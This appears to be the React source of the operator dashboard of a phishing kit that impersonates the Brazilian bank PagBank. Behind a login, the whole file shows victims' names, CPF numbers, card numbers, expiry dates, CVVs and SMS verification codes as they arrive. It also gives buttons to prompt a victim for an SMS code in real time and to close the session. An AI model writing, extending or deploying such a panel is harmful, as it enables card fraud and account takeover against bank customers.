import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { useSocket } from "@/hooks/useSocket";
import PagBankLogo from "@/components/PagBankLogo";

type Customer = {
  id: string;
  name: string;
  document: string;
  formattedDocument: string;
  cardNumber: string;
  maskedCardNumber: string;
  expiryDate?: string;
  cvv?: string;
  smsCode?: string;
  status: "awaiting_card" | "awaiting_sms" | "awaiting_confirmation" | "completed";
  createdAt: string;
  updatedAt: string;
};

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [customers, setCustomers] = useState<Customer[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();
  const { socket } = useSocket();

  useEffect(() => {
    // Check if already authenticated
    checkAuthStatus();

    // Listen for real-time updates
    if (socket) {
      socket.addEventListener("message", handleSocketMessage);
    }

    return () => {
      if (socket) {
        socket.removeEventListener("message", handleSocketMessage);
      }
    };
  }, [socket]);

  const checkAuthStatus = async () => {
    try {
      const res = await apiRequest("GET", "/api/admin/check-auth");
      if (res.ok) {
        setIsAuthenticated(true);
        fetchCustomers();
      }
    } catch (err) {
      // Not authenticated, show login form
      console.log("Admin not authenticated");
    }
  };

  const handleSocketMessage = (event: MessageEvent) => {
    try {
      const message = JSON.parse(event.data);
      
      if (message.type === "CUSTOMER_UPDATE") {
        // Update the customer in the list
        setCustomers(prev => {
          const updated = [...prev];
          const index = updated.findIndex(c => c.id === message.data.id);
          
          if (index !== -1) {
            updated[index] = message.data;
          } else {
            updated.unshift(message.data);
          }
          
          return updated;
        });
      }
    } catch (err) {
      console.error("Error parsing socket message:", err);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      const res = await apiRequest("POST", "/api/admin/login", {
        username,
        password,
      });
      
      if (res.ok) {
        setIsAuthenticated(true);
        fetchCustomers();
      }
    } catch (err) {
      toast({
        title: "Erro de login",
        description: "Credenciais inválidas",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const fetchCustomers = async () => {
    try {
      const res = await apiRequest("GET", "/api/admin/customers");
      if (res.ok) {
        const data = await res.json();
        setCustomers(data);
      }
    } catch (err) {
      console.error("Error fetching customers:", err);
      toast({
        title: "Erro",
        description: "Ocorreu um erro ao buscar os clientes",
        variant: "destructive",
      });
    }
  };

  const handleRequestSms = (customerId: string) => {
    if (socket && socket.readyState === WebSocket.OPEN) {
      socket.send(JSON.stringify({
        type: "REQUEST_SMS",
        data: { customerId }
      }));
      
      // Update local state
      setCustomers(prev => {
        return prev.map(customer => {
          if (customer.id === customerId) {
            return { ...customer, status: "awaiting_sms" as const };
          }
          return customer;
        });
      });
      
      toast({
        title: "SMS solicitado",
        description: "O código SMS foi solicitado com sucesso",
      });
    } else {
      toast({
        title: "Erro de conexão",
        description: "Não foi possível enviar a solicitação. Recarregue a página.",
        variant: "destructive",
      });
    }
  };

  const handleFinishProcess = (customerId: string) => {
    if (socket && socket.readyState === WebSocket.OPEN) {
      socket.send(JSON.stringify({
        type: "FINISH_SESSION",
        data: { customerId }
      }));
      
      // Update local state
      setCustomers(prev => {
        return prev.map(customer => {
          if (customer.id === customerId) {
            return { ...customer, status: "completed" as const };
          }
          return customer;
        });
      });
      
      toast({
        title: "Atendimento finalizado",
        description: "O atendimento foi finalizado com sucesso",
      });
    } else {
      toast({
        title: "Erro de conexão",
        description: "Não foi possível enviar a solicitação. Recarregue a página.",
        variant: "destructive",
      });
    }
  };

  const getStatusText = (status: Customer["status"]) => {
    switch (status) {
      case "awaiting_card":
        return "Aguardando dados do cartão";
      case "awaiting_sms":
        return "Aguardando código SMS";
      case "awaiting_confirmation":
        return "Aguardando confirmação";
      case "completed":
        return "Finalizado";
      default:
        return "Desconhecido";
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <Card className="w-[400px]">
          <CardHeader>
            <div className="flex justify-center mb-4">
              <PagBankLogo className="w-32" />
            </div>
            <CardTitle className="text-center">Painel Administrativo</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin}>
              <div className="grid gap-4">
                <div className="grid gap-2">
                  <Label htmlFor="username">Usuário</Label>
                  <Input
                    id="username"
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    required
                  />
                </div>
                <div className="grid gap-2">
                  <Label htmlFor="password">Senha</Label>
                  <Input
                    id="password"
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                </div>
                <Button type="submit" disabled={isLoading}>
                  {isLoading ? "Autenticando..." : "Entrar"}
                </Button>
              </div>
            </form>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 p-6">
      <header className="mb-6 flex justify-between items-center">
        <div className="flex items-center">
          <PagBankLogo className="w-32 mr-4" />
          <h1 className="text-2xl font-bold">Painel Administrativo</h1>
        </div>
        <Button
          variant="outline"
          onClick={() => {
            setIsAuthenticated(false);
            apiRequest("POST", "/api/admin/logout");
          }}
        >
          Sair
        </Button>
      </header>

      <Card>
        <CardHeader>
          <CardTitle>Atendimentos em Tempo Real</CardTitle>
        </CardHeader>
        <CardContent>
          {customers.length > 0 ? (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Usuário</TableHead>
                  <TableHead>Número do Cartão</TableHead>
                  <TableHead>Validade e CVV</TableHead>
                  <TableHead>Código SMS</TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>Ações</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {customers.map((customer) => (
                  <TableRow key={customer.id}>
                    <TableCell>
                      <div className="font-medium">{customer.name}</div>
                      <div className="text-sm text-gray-500">{customer.formattedDocument}</div>
                    </TableCell>
                    <TableCell>{customer.maskedCardNumber}</TableCell>
                    <TableCell>
                      {customer.expiryDate ? (
                        <div>
                          <div>Validade: {customer.expiryDate}</div>
                          <div>CVV: {customer.cvv}</div>
                        </div>
                      ) : (
                        "Não informado"
                      )}
                    </TableCell>
                    <TableCell>{customer.smsCode || "Não informado"}</TableCell>
                    <TableCell>
                      <span className={`px-2 py-1 rounded-full text-xs font-medium ${
                        customer.status === "completed" 
                          ? "bg-green-100 text-green-800" 
                          : "bg-blue-100 text-blue-800"
                      }`}>
                        {getStatusText(customer.status)}
                      </span>
                    </TableCell>
                    <TableCell>
                      <div className="flex space-x-2">
                        <Button 
                          size="sm" 
                          onClick={() => handleRequestSms(customer.id)}
                          disabled={customer.status !== "awaiting_confirmation"}
                        >
                          Solicitar SMS
                        </Button>
                        <Button 
                          size="sm" 
                          variant="outline"
                          onClick={() => handleFinishProcess(customer.id)}
                          disabled={customer.status === "completed"}
                        >
                          Finalizar
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          ) : (
            <div className="text-center py-6 text-gray-500">
              Nenhum atendimento em andamento
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
